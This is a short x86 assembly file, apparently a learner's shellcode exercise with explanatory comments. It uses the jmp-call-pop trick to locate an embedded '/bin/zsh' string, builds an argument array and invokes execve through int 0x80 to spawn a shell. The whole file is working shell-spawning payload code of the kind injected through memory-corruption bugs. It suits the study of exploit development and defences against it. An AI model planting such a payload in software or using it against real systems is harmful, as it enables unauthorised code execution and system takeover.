
global _start

section .text

_start: 


	jmp short call_shellcode
	
	

shellcode: 

	; this esi contain the address of this string 
	
	pop esi 
	xor ebx, ebx
	
	; Now we need to move the value 0x0 which can be reference by bl into the position of A 	 
	
	mov byte [esi +8], bl
	mov dword [esi +9 ], esi
	mov dword [esi +13], ebx
	lea ebx, [esi] ;now the ebx also point to the starting of string 
	lea ecx, [esi +9]
	lea edx, [esi +13]

	xor eax, eax
	mov al, 0xb
	int 0x80
		

call_shellcode:
	
	call shellcode
	message db "/bin/zshABBBBCCCC"

